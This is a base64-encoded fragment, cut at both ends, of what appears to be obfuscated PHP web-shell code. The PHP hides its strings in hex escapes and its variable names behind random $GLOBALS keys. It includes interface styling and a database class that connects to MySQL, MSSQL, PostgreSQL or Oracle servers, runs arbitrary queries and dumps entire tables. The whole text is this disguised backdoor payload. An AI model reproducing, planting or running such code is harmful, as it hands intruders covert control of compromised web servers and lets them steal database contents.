ZmbnQtc2lceDdhXHg2NTogMTJceDcweDsgXHg2Nm9uXHg3NC1mYVx4NmRpbHk6XHgyMFx4NjFceDcyXHg2OVx4NjFceDZjOyB0XHg2NXh0LWRceDY1XHg2M1x4NmZceDcyXHg2MVx4NzRpXHg2Zlx4NmU6XHgyMFx4NmVvXHg2ZWVceDNiXHgyMH1cbiBceDIwIFx4MjBceDIwICAgXHgyMCBceDIwICNtXHg2MWluXHgyMFx4NjE6XHg2OFx4NmZceDc2XHg2NVx4NzJ7Y29ceDZjb1x4NzI6XHgyMFx4MjNceDMwMEZceDQ2XHgzMDA7IHRceDY1eHQtXHg2NFx4NjVceDYzb3JhdFx4NjlvbjpceDIwdVx4NmVceDY0ZXJceDZjXHg2OW5lO31cblx4MjBceDIwXHgyMCBceDIwICAgXHgyMCAgXHgyMFx4MjNceDYyYXJ7XHg3N1x4NjlceDY0dFx4Njg6IDFceDMwXHgzMCVceDNiXHgyMHBceDZmXHg3M2lceDc0XHg2OW9ceDZlOlx4MjBmaVx4NzhlXHg2NFx4M2IgYlx4NjFceDYzXHg2Ylx4NjdceDcyXHg2ZnVceDZlXHg2NC1jXHg2Zlx4NmNvcjogXHg2MmxhY2s7XHgyMGJceDZmdHRceDZmbTogMFx4M2IgXHg2Nm9uXHg3NC1zaVx4N2FceDY1Olx4MjBceDMxMHBceDc4O1x4MjBceDZjXHg2NWZ0Olx4MjAwO1x4MjBib1x4NzJceDY0XHg2NXItXHg3NG9ceDcwOlx4MjBceDMxcFx4Nzggc1x4NmZceDZjXHg2OWQgXHgyM0ZceDQ2XHg0Nlx4NDZceDQ2XHg0Nlx4M2IgXHg2OFx4NjVceDY5XHg2N1x4Njh0Olx4MjAxXHgzMlx4NzBceDc4O1x4MjBceDcwXHg2MWRceDY0XHg2OVx4NmVceDY3Olx4MjBceDM1XHg3MFx4NzhceDNifVxuXHgzYy9ceDczdHlsXHg2NVx4M2VcblxuXHgzYy9oZWFkXHgzZVxuIjtmdW5jdGlvbiBpbigkdHlwZSwkbmFtZSwkc2l6ZSwkdmFsdWUsJGNoZWNrZWQ9MCl7JHsiXHg0N1x4NGNceDRmQkFceDRjXHg1MyJ9WyJceDZheVx4NjFmXHg3OVx4NjR2XHg2NFx4NjUiXT0iXHg3Nlx4NjFceDZjXHg3NVx4NjUiOyR7Ilx4NDdceDRjT0JBXHg0Y1MifVsiXHg3NHdceDZlXHg2OXJnXHg3NiJdPSJuXHg2MVx4NmRlIjskeyJceDQ3XHg0Y1x4NGZCXHg0MUxceDUzIn1bIlx4NmZceDczZW1ceDZhXHg2OFx4NzYiXT0iXHg3M1x4NjlceDdhXHg2NSI7JHsiXHg0N1x4NGNceDRmXHg0MkFceDRjUyJ9WyJxa1x4NjlceDcyXHg2NFx4NjZ0XHg2ZCJdPSJyZVx4NzQiOyR7JHsiXHg0N1x4NGNPXHg0Mlx4NDFMUyJ9WyJxa1x4NjlceDcyXHg2NFx4NjZ0bSJdfT0iXHgzY1x4NjlceDZlcFx4NzVceDc0XHgyMFx4NzRceDc5XHg3MGVceDNkIi4keyR7Ilx4NDdceDRjXHg0Zlx4NDJceDQxXHg0Y1x4NTMifVsiXHg3N1x4NzVceDc5XHg3M1x4NzRceDcyXHg3NCJdfS4iXHgyMG5ceDYxbWVceDNkIi4keyR7Ilx4NDdceDRjT0JceDQxXHg0Y1x4NTMifVsiXHg3NFx4NzdceDZlaVx4NzJceDY3XHg3NiJdfS4iXHgyMCI7aWYoJHskeyJceDQ3XHg0Y09ceDQyQVx4NGNceDUzIn1bIm9ceDczXHg2NVx4NmRceDZhXHg2OFx4NzYiXX0hPTApeyRwZWZyc3Z6cmRhcz0iXHg3M1x4NjlceDdhXHg2NSI7JHskeyJceDQ3XHg0Y09ceDQyXHg0MUxTIn1bIlx4NjhceDcyc3d3clx4NjNceDcwclx4NzciXX0uPSJceDczaXplPSIuJHskcGVmcnN2enJkYXN9LiIgIjt9JHskeyJceDQ3TE9ceDQyQUxTIn1bIlx4Njhyc3dceDc3cmNwXHg3MnciXX0uPSJ2XHg2MVx4NmNceDc1XHg2NVx4M2RcIiIuJHskeyJceDQ3XHg0Y1x4NGZceDQyXHg0MVx4NGNceDUzIn1bImp5YVx4NjZceDc5XHg2NFx4NzZceDY0ZSJdfS4iXHgyMiI7aWYoJHskeyJceDQ3XHg0Y09CXHg0MVx4NGNTIn1bInBceDY4XHg3OW1ceDdhaVx4NzN0XHg3NVx4NzVxIl19KSR7JHsiR0xceDRmXHg0Mlx4NDFceDRjXHg1MyJ9WyJoXHg3Mlx4NzNceDc3d3JjXHg3MFx4NzJ3Il19Lj0iXHgyMFx4NjNceDY4ZWNrXHg2NVx4NjQiO3JldHVybiR7JHsiXHg0N1x4NGNPXHg0MkFceDRjUyJ9WyJceDY4XHg3Mlx4NzNceDc3d1x4NzJceDYzXHg3MFx4NzJceDc3Il19LiI+Ijt9Y2xhc3MgbXlfc3Fse3ZhciRob3N0PSdsb2NhbGhvc3QnO3ZhciRwb3J0PScnO3ZhciR1c2VyPScnO3ZhciRwYXNzPScnO3ZhciRiYXNlPScnO3ZhciRkYj0nJzt2YXIkY29ubmVjdGlvbjt2YXIkcmVzO3ZhciRlcnJvcjt2YXIkcm93czt2YXIkY29sdW1uczt2YXIkbnVtX3Jvd3M7dmFyJG51bV9maWVsZHM7dmFyJGR1bXA7ZnVuY3Rpb24gY29ubmVjdCgpeyRpZnliaXI9Ilx4NzN0ciI7JHJ3enBuZmdoPSJceDY1XHg3MnJvXHg3MiI7c3dpdGNoKCR0aGlzLT5kYil7Y2FzZSJNeVNRXHg0YyI6aWYoZW1wdHkoJHRoaXMtPnBvcnQpKXskdGhpcy0+cG9ydD0iXHgzMzMwXHgzNiI7fWlmKCFmdW5jdGlvbl9leGlzdHMoIm15c1x4NzFceDZjXHg1ZmNvXHg2ZVx4NmVlY1x4NzQiKSlyZXR1cm4gMDskdGhpcy0+Y29ubmVjdGlvbj1AbXlzcWxfY29ubmVjdCgkdGhpcy0+aG9zdC4iOiIuJHRoaXMtPnBvcnQsJHRoaXMtPnVzZXIsJHRoaXMtPnBhc3MpO2lmKGlzX3Jlc291cmNlKCR0aGlzLT5jb25uZWN0aW9uKSlyZXR1cm4gMTskdGhpcy0+ZXJyb3I9QG15c3FsX2Vycm5vKCkuIiA6XHgyMCIuQG15c3FsX2Vycm9yKCk7YnJlYWs7Y2FzZSJceDRkU1NceDUxTCI6aWYoZW1wdHkoJHRoaXMtPnBvcnQpKXskdGhpcy0+cG9ydD0iXHgzMVx4MzQzXHgzMyI7fWlmKCFmdW5jdGlvbl9leGlzdHMoIm1ceDczc3FceDZjX2NceDZmXHg2ZVx4NmVceDY1Y1x4NzQiKSlyZXR1cm4gMDskdGhpcy0+Y29ubmVjdGlvbj1AbXNzcWxfY29ubmVjdCgkdGhpcy0+aG9zdC4iLCIuJHRoaXMtPnBvcnQsJHRoaXMtPnVzZXIsJHRoaXMtPnBhc3MpO2lmKCR0aGlzLT5jb25uZWN0aW9uKXJldHVybiAxOyR0aGlzLT5lcnJvcj0iXHg0M2FceDZlJ3RceDIwXHg2M1x4NmZceDZlXHg2ZWVjdCB0XHg2Zlx4MjBzZVx4NzJceDc2ZXIiO2JyZWFrO2Nhc2UiXHg1MG9ceDczdGdceDcyZVNceDUxXHg0YyI6aWYoZW1wdHkoJHRoaXMtPnBvcnQpKXskdGhpcy0+cG9ydD0iXHgzNTQzMiI7fSR7JHsiXHg0N1x4NGNceDRmXHg0MkFceDRjXHg1MyJ9WyJceDczZ1x4NzlceDZib1x4NjdceDY3bG5ceDcyZCJdfT0iXHg2OG9ceDczdD0nIi4kdGhpcy0+aG9zdC4iJ1x4MjBwXHg2ZnJceDc0XHgzZFx4MjciLiR0aGlzLT5wb3J0LiInIHVzZVx4NzI9XHgyNyIuJHRoaXMtPnVzZXIuIlx4MjdceDIwcFx4NjFceDczXHg3M1x4NzdceDZmclx4NjQ9XHgyNyIuJHRoaXMtPnBhc3MuIidceDIwZGJceDZlXHg2MW1lPVx4MjciLiR0aGlzLT5iYXNlLiInIjtpZighZnVuY3Rpb25fZXhpc3RzKCJceDcwXHg2N1x4NWZjb25uZWNceDc0IikpcmV0dXJuIDA7JHRoaXMtPmNvbm5lY3Rpb249QHBnX2Nvbm5lY3QoJHskaWZ5YmlyfSk7aWYoaXNfcmVzb3VyY2UoJHRoaXMtPmNvbm5lY3Rpb24pKXJldHVybiAxOyR0aGlzLT5lcnJvcj1AcGdfbGFzdF9lcnJvcigkdGhpcy0+Y29ubmVjdGlvbik7YnJlYWs7Y2FzZSJceDRmXHg3MmFceDYzXHg2Y1x4NjUiOmlmKCFmdW5jdGlvbl9leGlzdHMoIlx4NmZceDYzaVx4NmNceDZmXHg2N29ceDZlIikpcmV0dXJuIDA7JHRoaXMtPmNvbm5lY3Rpb249QG9jaWxvZ29uKCR0aGlzLT51c2VyLCR0aGlzLT5wYXNzLCR0aGlzLT5iYXNlKTtpZihpc19yZXNvdXJjZSgkdGhpcy0+Y29ubmVjdGlvbikpcmV0dXJuIDE7JHskeyJceDQ3XHg0Y09ceDQyQVx4NGNTIn1bIlx4NmF1XHg3OFx4NzNicCJdfT1Ab2NpZXJyb3IoKTskdGhpcy0+ZXJyb3I9JHskcnd6cG5mZ2h9WyJtXHg2NVx4NzNzYWdceDY1Il07YnJlYWs7fXJldHVybiAwO31mdW5jdGlvbiBzZWxlY3RfZGIoKXtzd2l0Y2goJHRoaXMtPmRiKXtjYXNlIlx4NGRceDc5XHg1M1x4NTFMIjppZihAbXlzcWxfc2VsZWN0X2RiKCR0aGlzLT5iYXNlLCR0aGlzLT5jb25uZWN0aW9uKSlyZXR1cm4gMTskdGhpcy0+ZXJyb3I9QG15c3FsX2Vycm5vKCkuIlx4MjA6XHgyMCIuQG15c3FsX2Vycm9yKCk7YnJlYWs7Y2FzZSJNXHg1M1NRXHg0YyI6aWYoQG1zc3FsX3NlbGVjdF9kYigkdGhpcy0+YmFzZSwkdGhpcy0+Y29ubmVjdGlvbikpcmV0dXJuIDE7JHRoaXMtPmVycm9yPSJceDQzYW5ceDI3dFx4MjBzXHg2NWxceDY1Y3RceDIwZGF0YWJhc2UiO2JyZWFrO2Nhc2UiUG9ceDczXHg3NFx4NjdceDcyXHg2NVNRTCI6cmV0dXJuIDE7YnJlYWs7Y2FzZSJPXHg3MmFceDYzbFx4NjUiOnJldHVybiAxO2JyZWFrO31yZXR1cm4gMDt9ZnVuY3Rpb24gcXVlcnkoJHF1ZXJ5KXskeyJceDQ3XHg0Y1x4NGZceDQyXHg0MUxTIn1bIlx4NjhceDc2XHg3Mlx4NjhceDczXHg2ZFx4NjZmblx4NjIiXT0icXVceDY1XHg3MnkiOyR0aGlzLT5yZXM9JHRoaXMtPmVycm9yPSIiOyR7Ilx4NDdMXHg0Zlx4NDJceDQxXHg0Y1x4NTMifVsiXHg3YVx4NjNceDc0aHBceDYyXHg2Nlx4NzV4XHg3NVx4NzlceDZkIl09Ilx4NzFceDc1XHg2NXJceDc5Ijskam1wbWFtcXI9Ilx4NzF1ZVx4NzJ5Ijtzd2l0Y2goJHRoaXMtPmRiKXtjYXNlIk15U1x4NTFMIjppZihmYWxzZT09PSgkdGhpcy0+cmVzPUBteXNxbF9xdWVyeSgiLyoiLmNocigwKS4iKi8iLiR7JHsiXHg0N1x4NGNceDRmXHg0Mlx4NDFceDRjUyJ9WyJceDY2XHg2MmFceDY3eG9ceDY5XHg2ZGNceDY2Il19LCR0aGlzLT5jb25uZWN0aW9uKSkpeyR0aGlzLT5lcnJvcj1AbXlzcWxfZXJyb3IoJHRoaXMtPmNvbm5lY3Rpb24pO3JldHVybiAwO31lbHNlIGlmKGlzX3Jlc291cmNlKCR0aGlzLT5yZXMpKXtyZXR1cm4gMTt9cmV0dXJuIDI7YnJlYWs7Y2FzZSJNXHg1M1x4NTNceDUxTCI6aWYoZmFsc2U9PT0oJHRoaXMtPnJlcz1AbXNzcWxfcXVlcnkoJHskeyJceDQ3TFx4NGZceDQyQVx4NGNTIn1bIlx4Njh2XHg3Mlx4NjhzbVx4NjZmblx4NjIiXX0sJHRoaXMtPmNvbm5lY3Rpb24pKSl7JHRoaXMtPmVycm9yPSJRXHg3NVx4NjVyXHg3OSBlXHg3Mlx4NzJvXHg3MiI7cmV0dXJuIDA7fWVsc2UgaWYoQG1zc3FsX251bV9yb3dzKCR0aGlzLT5yZXMpPjApe3JldHVybiAxO31yZXR1cm4gMjticmVhaztjYXNlIlx4NTBvXHg3M1x4NzRnXHg3MmVceDUzXHg1MUwiOmlmKGZhbHNlPT09KCR0aGlzLT5yZXM9QHBnX3F1ZXJ5KCR0aGlzLT5jb25uZWN0aW9uLCR7JGptcG1hbXFyfSkpKXskdGhpcy0+ZXJyb3I9QHBnX2xhc3RfZXJyb3IoJHRoaXMtPmNvbm5lY3Rpb24pO3JldHVybiAwO31lbHNlIGlmKEBwZ19udW1fcm93cygkdGhpcy0+cmVzKT4wKXtyZXR1cm4gMTt9cmV0dXJuIDI7YnJlYWs7Y2FzZSJPXHg3Mlx4NjFceDYzbFx4NjUiOmlmKGZhbHNlPT09KCR0aGlzLT5yZXM9QG9jaXBhcnNlKCR0aGlzLT5jb25uZWN0aW9uLCR7JHsiXHg0N1x4NGNceDRmQlx4NDFceDRjXHg1MyJ9WyJ6XHg2M1x4NzRceDY4cGJceDY2XHg3NVx4Nzh1XHg3OVx4NmQiXX0pKSl7JHRoaXMtPmVycm9yPSJceDUxXHg3NVx4NjVceDcyXHg3OSBceDcwYVx4NzJceDczZVx4MjBceDY1XHg3Mlx4NzJceDZmXHg3MiI7fWVsc2V7JHsiXHg0N0xPXHg0MkFceDRjXHg1MyJ9WyJceDc1XHg2NW9ceDZiZ1x4NjNceDYxXHg3N1x4NzgiXT0iXHg2NXJceDcyXHg2Zlx4NzIiO2lmKEBvY2lleGVjdXRlKCR0aGlzLT5yZXMpKXtpZihAb2Npcm93Y291bnQoJHRoaXMtPnJlcykhPTApcmV0dXJuIDI7cmV0dXJuIDE7fSR7JHsiXHg0N1x4NGNceDRmXHg0Mlx4NDFceDRjXHg1MyJ9WyJceDZhdXhzYlx4NzAiXX09QG9jaWVycm9yKCk7JHRoaXMtPmVycm9yPSR7JHsiXHg0N1x4NGNceDRmQlx4NDFceDRjXHg1MyJ9WyJceDc1XHg2NVx4NmZceDZiXHg2N1x4NjNceDYxXHg3N3giXX1bIlx4NmRlc1x4NzNhXHg2N1x4NjUiXTt9YnJlYWs7fXJldHVybiAwO31mdW5jdGlvbiBnZXRfcmVzdWx0KCl7JHRoaXMtPnJvd3M9YXJyYXkoKTskdGhpcy0+Y29sdW1ucz1hcnJheSgpOyR0aGlzLT5udW1fcm93cz0kdGhpcy0+bnVtX2ZpZWxkcz0wO3N3aXRjaCgkdGhpcy0+ZGIpe2Nhc2UiXHg0ZFx4NzlTXHg1MVx4NGMiOiR0aGlzLT5udW1fcm93cz1AbXlzcWxfbnVtX3Jvd3MoJHRoaXMtPnJlcyk7JHRoaXMtPm51bV9maWVsZHM9QG15c3FsX251bV9maWVsZHMoJHRoaXMtPnJlcyk7d2hpbGUoZmFsc2UhPT0oJHRoaXMtPnJvd3NbXT1AbXlzcWxfZmV0Y2hfYXNzb2MoJHRoaXMtPnJlcykpKTtAbXlzcWxfZnJlZV9yZXN1bHQoJHRoaXMtPnJlcyk7aWYoJHRoaXMtPm51bV9yb3dzKXskdGhpcy0+Y29sdW1ucz1AYXJyYXlfa2V5cygkdGhpcy0+cm93c1swXSk7cmV0dXJuIDE7fWJyZWFrO2Nhc2UiTVx4NTNceDUzUUwiOiR0aGlzLT5udW1fcm93cz1AbXNzcWxfbnVtX3Jvd3MoJHRoaXMtPnJlcyk7JHRoaXMtPm51bV9maWVsZHM9QG1zc3FsX251bV9maWVsZHMoJHRoaXMtPnJlcyk7d2hpbGUoZmFsc2UhPT0oJHRoaXMtPnJvd3NbXT1AbXNzcWxfZmV0Y2hfYXNzb2MoJHRoaXMtPnJlcykpKTtAbXNzcWxfZnJlZV9yZXN1bHQoJHRoaXMtPnJlcyk7aWYoJHRoaXMtPm51bV9yb3dzKXskdGhpcy0+Y29sdW1ucz1AYXJyYXlfa2V5cygkdGhpcy0+cm93c1swXSk7cmV0dXJuIDE7fWJyZWFrO2Nhc2UiUFx4NmZceDczXHg3NGdyXHg2NVNRXHg0YyI6JHRoaXMtPm51bV9yb3dzPUBwZ19udW1fcm93cygkdGhpcy0+cmVzKTskdGhpcy0+bnVtX2ZpZWxkcz1AcGdfbnVtX2ZpZWxkcygkdGhpcy0+cmVzKTt3aGlsZShmYWxzZSE9PSgkdGhpcy0+cm93c1tdPUBwZ19mZXRjaF9hc3NvYygkdGhpcy0+cmVzKSkpO0BwZ19mcmVlX3Jlc3VsdCgkdGhpcy0+cmVzKTtpZigkdGhpcy0+bnVtX3Jvd3MpeyR0aGlzLT5jb2x1bW5zPUBhcnJheV9rZXlzKCR0aGlzLT5yb3dzWzBdKTtyZXR1cm4gMTt9YnJlYWs7Y2FzZSJPcmFceDYzXHg2Y2UiOiR0aGlzLT5udW1fZmllbGRzPUBvY2ludW1jb2xzKCR0aGlzLT5yZXMpO3doaWxlKGZhbHNlIT09KCR0aGlzLT5yb3dzW109QG9jaV9mZXRjaF9hc3NvYygkdGhpcy0+cmVzKSkpJHRoaXMtPm51bV9yb3dzKys7QG9jaWZyZWVzdGF0ZW1lbnQoJHRoaXMtPnJlcyk7aWYoJHRoaXMtPm51bV9yb3dzKXskdGhpcy0+Y29sdW1ucz1AYXJyYXlfa2V5cygkdGhpcy0+cm93c1swXSk7cmV0dXJuIDE7fWJyZWFrO31yZXR1cm4gMDt9ZnVuY3Rpb24gZHVtcCgkdGFibGUpe2lmKGVtcHR5KCR7JHsiR0xPXHg0MkFceDRjXHg1MyJ9WyJ1XHg2Zlx4NzFceDY3cG5ceDc4XHg2ZmJpXHg3MVx4NjgiXX0pKXJldHVybiAwOyRkaHp1amR3ZWpnaT0iXHg3NGFceDYyXHg2Y1x4NjUiOyR0aGlzLT5kdW1wPWFycmF5KCk7JHRoaXMtPmR1bXBbMF09Ilx4MjMjIjskdGhpcy0+ZHVtcFsxXT0iI1x4MjNceDIwLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tXHgyMCI7JHRoaXMtPmR1bXBbMl09Ilx4MjMjICBceDQzXHg3Mlx4NjVceDYxdGVceDY0OiAiLmRhdGUoIlx4NjQvbS9ZIFx4NDg6aTpzIik7JHsiR0xceDRmQlx4NDFMUyJ9WyJceDczYVx4NjNceDZlXHg2MmlvXHg3OFx4NjR4dSJdPSJ0XHg2MWJceDZjXHg2NSI7JHRoaXMtPmR1bXBbM109Ilx4MjNceDIzIFx4NDRhdGFceDYyYXNceDY1OiAiLiR0aGlzLT5iYXNlOyRia2NuZ3lrYz0iaSI7JHRoaXMtPmR1bXBbNF09Ilx4MjNceDIzIFx4MjAgIFRceDYxYlx4NmNceDY1Olx4MjAiLiR7JGRoenVqZHdlamdpfTskdGhpcy0+ZHVtcFs1XT0iI1x4MjNceDIwLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tICI7c3dpdGNoKCR0aGlzLT5kYil7Y2FzZSJNeVNceDUxXHg0YyI6JHRoaXMtPmR1bXBbMF09IiNceDIzIE1ceDc5XHg1M1FceDRjXHgyMGR1bXAiO2lmKCR0aGlzLT5xdWVyeSgiLyoiLmNocigwKS4iKi9ceDIwXHg1M0hceDRmVyBDUlx4NDVceDQxXHg1NFx4NDVceDIwVFx4NDFCXHg0Y0VceDIwXHg2MCIuJHskeyJHXHg0Y1x4NGZCXHg0MUxceDUzIn1bInVceDZmXHg3MVx4NjdceDcwXHg2ZVx4NzhvXHg2MmlceDcxXHg2OCJdfS4iYCIpIT0xKXJldHVybiAwO2lmKCEkdGhpcy0+Z2V0X3Jlc3VsdCgpKXJldHVybiAwOyR0aGlzLT5kdW1wW109JHRoaXMtPnJvd3NbMF1bIlx4NDNceDcyXHg2NWF0XHg2NSBceDU0YVx4NjJsXHg2NSJdLiI7IjskdGhpcy0+ZHVtcFtdPSIjXHgyMyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1ceDIwIjtpZigkdGhpcy0+cXVlcnkoIi8qIi5jaHIoMCkuIiovIFNFXHg0Y1x4NDVceDQzXHg1NCAqXHgyMFx4NDZST1x4NGQgYCIuJHskeyJceDQ3XHg0Y1x4NGZCXHg0MUxceDUzIn1bIlx4NzVceDZmXHg3MVx4NjdceDcwXHg2ZVx4NzhvYmlceDcxaCJdfS4iYCIpIT0xKXJldHVybiAwO2lmKCEkdGhpcy0+Z2V0X3Jlc3VsdCgpKXJldHVybiAwO2ZvcigkeyR7Ilx4NDdceDRjXHg0Zlx4NDJBTFx4NTMifVsiXHg3M1x4N2FmXHg3OVx4NmFceDZmcCJdfT0wOyR7JHsiXHg0N0xPXHg0Mlx4NDFceDRjUyJ9WyJzXHg3YWZceDc5XHg2YVx4NmZceDcwIl19PCR0aGlzLT5udW1fcm93czskeyR7Ilx4NDdceDRjT1x4NDJBXHg0Y1MifVsiXHg3M1x4N2FceDY2XHg3OWpceDZmXHg3MCJdfSsrKXskeWhvYW90anc9ImkiOyR7IkdceDRjT0JceDQxXHg0Y1x4NTMifVsidlx4NmFsXHg2NFx4NzZneVx4NmEiXT0idGFceDYyXHg2Y1x4NjUiOyR7IkdMT0JBTFx4NTMifVsiXHg2OFx4NzhceDY4XHg2Y2ZceDYzXHg3MXlceDY1XHg3NVx4NzEiXT0iXHg2YiI7JHsiXHg0N1x4NGNceDRmQkFceDRjUyJ9WyJceDcxZVx4NzNceDZhXHg2MVx4NzdceDZkXHg2ZFx4NjMiXT0iXHg3NiI7Zm9yZWFjaCgkdGhpcy0+cm93c1skeyR7IkdMT1x4NDJBXHg0Y1MifVsic1x4N2FceDY2eWpceDZmcCJdfV1hcyR7JHsiR1x4NGNPXHg0Mlx4NDFMUyJ9WyJceDY4XHg3OFx4NjhceDZjZlx4NjNxeWVceDc1XHg3MSJdfT0+JHskeyJceDQ3XHg0Y1x4NGZCXHg0MVx4NGNceDUzIn1bInFceDY1c2pceDYxd1x4NmRceDZkYyJdfSl7JHsiXHg0N1x4NGNPXHg0Mlx4NDFMXHg1MyJ9WyJceDZmXHg3OHdceDc0XHg2NFx4NzJceDYyXHg3MiJdPSJceDY5IjskdGhpcy0+cm93c1skeyR7Ilx4NDdMXHg0Zlx4NDJceDQxXHg0Y1x4NTMifVsiXHg2Zlx4NzhceDc3dGRyXHg2Mlx4NzIiXX1dWyR7JHsiXHg0N1x4NGNPXHg0Mlx4NDFMXHg1MyJ9WyJvXHg3OVx4NmJceDczXHg3M1x4NmNceDZhXHg3NFx4NzZsXHg3YSJdfV09QG15c3FsX3JlYWxfZXNjYXBlX3N0cmluZygkeyR7Ilx4NDdceDRjT1x4NDJBXHg0Y1x4NTMifVsiXHg3OG1jXHg2OFx4NzhceDc3c1x4NzBceDcyIl19KTt9JHRoaXMtPmR1bXBbXT0iSVx4NGVTXHg0NVx4NTJceDU0IFx4NDlceDRlXHg1NE9ceDIwXHg2MCIuJHskeyJHTFx4NGZceDQyXHg0MUxTIn1bIlx4NzZceDZhXHg2Y1x4NjRceDc2XHg2N1x4NzlceDZhIl19LiJceDYwIChgIi5AaW1wbG9kZSgiYCxceDIwYCIsJHRoaXMtPmNvbHVtbnMpLiJgKVx4MjBWXHg0MUxVRVx4NTNceDIwKCciLkBpbXBsb2RlKCInLFx4MjBceDI3IiwkdGhpcy0+cm93c1skeyR5aG9hb3Rqd31dKS4iXHgyNyk7Ijt9YnJlYWs7Y2FzZSJceDRkXHg1M1x4NTNceDUxTCI6JHRoaXMtPmR1bXBbMF09Ilx4MjNceDIzXHgyMFx4NGRTXHg1M1x4NTFMXHgyMGR1XHg2ZFx4NzAiO2lmKCR0aGlzLT5xdWVyeSgiXHg1M0VceDRjRUNUICpceDIwXHg0NlJPTSAiLiR7JHsiR1x4NGNPXHg0Mlx4NDFMXHg1MyJ9WyJzYVx4NjNceDZlYlx4NjlceDZmeFx4NjR4XHg3NSJdfSkhPTEpcmV0dXJuIDA7aWYoISR0aGlzLT5nZXRfcmVzdWx0KCkpcmV0dXJuIDA7Zm9yKCR7JHsiR1x4NGNPXHg0Mlx4NDFceDRjUyJ9WyJzelx4NjZ5XHg2YW9wIl19PTA7JHskYmtjbmd5a2N9PCR0aGlzLT5udW1fcm93czskeyR7IkdceDRjT0JBXHg0Y1x4NTMifVsiXHg3M3pmeWpvcCJdfSsrKXskeyJHXHg0Y09ceDQyXHg0MUxceDUzIn1bIlx4NmNceDZjXHg3Mlx4NzNceDc0XHg3NVx4NjdceDZmY3QiXT0iXHg3NFx4NjFiXHg2Y2UiOyR7IkdceDRjXHg0Zlx4NDJceDQxXHg0Y1x4NTMifVsiXHg2ZVx4NzFceDcxXHg3OVx4NzNceDZlIl09InYiOyR5ZHZyaXc9Ilx4NmIiO2ZvcmVhY2goJHRoaXMtPnJvd3NbJHskeyJceDQ3TE9ceDQyXHg0MVx4NGNTIn1bInN6XHg2NnlceDZhXHg2Zlx4NzAiXX1dYXMkeyR5ZHZyaXd9PT4keyR7Ilx4NDdceDRjXHg0Zlx4NDJBTFx4NTMifVsibnFxXHg3OVx4NzNceDZlIl19KXskeyJceDQ3XHg0Y1x4NGZceDQyXHg0MUxTIn1bIlx4NzNceDY1Y1x4NzBceDYzXHg2YiJdPSJceDZiIjskb3RobHN4bnBuZnRoPSJceDc2IjskbHJ1bGpyc289ImkiOyR0aGlzLT5yb3dzWyR7JGxydWxqcnNvfV1bJHskeyJceDQ3XHg0Y1x4NGZceDQyQUxceDUzIn1bIlx4NzNlY3BceDYzayJdfV09QGFkZHNsYXNoZXMoJHskb3RobHN4bnBuZnRofSk7fSR0aGlzLT5kdW1wW109Ilx4NDlceDRlXHg1M0VSXHg1NFx4MjBJXHg0ZVx4NTRceDRmICIuJHskeyJceDQ3TFx4NGZceDQyXHg0MUxceDUzIn1bImxceDZjclx4NzNceDc0XHg3NVx4NjdceDZmXHg2M3QiXX0uIlx4MjAoIi5AaW1wbG9kZSgiLFx4MjAiLCR0aGlzLT5jb2x1bW5zKS4iKVx4MjBWXHg0MUxceDU1XHg0NVx4NTNceDIwKFx4MjciLkBpbXBsb2RlKCJceDI3LCAnIiwkdGhpcy0+cm93c1skeyR7IkdMXHg0Zlx4NDJceDQxXHg0Y1x4NTMifVsiXHg3M3pceDY2XHg3OVx4NmFceDZmXHg3MCJdfV0pLiJceDI3KVx4M2IiO31icmVhaztjYXNlIlBceDZmc3RncmVTXHg1MUwiOiR0aGlzLT5kdW1wWzBdPSIjXHgyM1x4MjBceDUwXHg2Zlx4NzN0XHg2N1x4NzJlXHg1M1x4NTFMIGR1XHg2ZFx4NzAiO2lmKCR0aGlzLT5xdWVyeSgiU0VceDRjXHg0NUNUICogRlJPTVx4MjAiLiR7JHsiR1x4NGNPXHg0Mlx4NDFceDRjXHg1MyJ9WyJceDc1XHg2Zlx4NzFceDY3XHg3MFx4NmVceDc4XHg2Zlx4NjJceDY5XHg3MVx4NjgiXX0pIT0xKXJldHVybiAwO2lmKCEkdGhpcy0+Z2V0X3Jlc3VsdCgpKXJldHVybiAwO2ZvcigkeyR7Ilx4NDdceDRjXHg0Zlx4NDJceDQxTFx4NTMifVsic1x4N2FceDY2eVx4NmFceDZmXHg3MCJdfT0wOyR7JHsiR0xceDRmXHg0MkFMXHg1MyJ9WyJceDczemZ5alx4NmZceDcwIl19PCR0aGlzLT5udW1fcm93czskeyR7Ilx4NDdceDRjXHg0Zlx4NDJceDQxXHg0Y1x4NTMifVsiXHg3M3pmeVx4NmFceDZmcCJdfSsrKXtmb3JlYWNoKCR0aGlzLT5yb3dzWyR7JHsiXHg0N1x4NGNceDRmXHg0MkFceDRjXHg1MyJ9WyJceDczXHg3YVx4NjZ5alx4NmZceDcwIl19XWFzJHskeyJHTFx4NGZCXHg0MVx4NGNceDUzIn1bIlx4NmZceDc5XHg2Ylx4NzNceDczXHg2Y1x4NmF0XHg3Nlx4NmNceDdhIl19PT4keyR7Ilx4NDdceDRjT1x4NDJceDQxXHg0Y1x4NTMifVsiXHg3OG1ceDYzXHg2OHhceDc3XHg3M1x4NzBceDcyIl19KXskeyJHXHg0Y09ceDQyQVx4NGNceDUzIn1bInVceDcxY1x4NmNvXHg3Nlx4NzhceDZlIl09ImsiOyRpa3Nkb3RjPSJceDY5IjskdGhpcy0+cm93c1skeyRpa3Nkb3RjfV1bJHskeyJceDQ3TFx4NGZceDQyQVx4NGNTIn1bInVceDcxXHg2M2xvdlx4NzhuIl19XT1AYWRkc2xhc2hlcygkeyR7Ilx4NDdceDRjXHg0ZkJceDQxXHg0Y1x4NTMifVsiXHg3OG1ceDYzaFx4NzhceDc3XHg3M1x4NzByIl19KTt9JHRoaXMtPmR1bXBbXT0iXHg0OVx4NGVceDUzXHg0NVJceDU0IElceDRlVE9ceDIwIi4keyR7Ilx4NDdMXHg0Zlx4NDJceDQxTFx4NTMifVsiXHg3NVx4NmZceDcxXHg2N1x4NzBceDZleFx4NmZceDYyXHg2OXFoIl19LiIgKCIuQGltcGxvZGUoIiwgIiwkdGhpcy0+Y29sdW1ucykuIilceDIwVlx4NDFMXHg1NUVceDUzIChceDI3Ii5AaW1wbG9kZSgiJywgJyIsJHRoaXMtPnJvd3NbJHskeyJHTFx4NGZceDQyXHg0MUxceDUzIn1bInNceDdhXHg2NnlceDZhXHg2Zlx4NzAiXX1dKS4iXHgyNyk7Ijt9YnJlYWs7Y2FzZS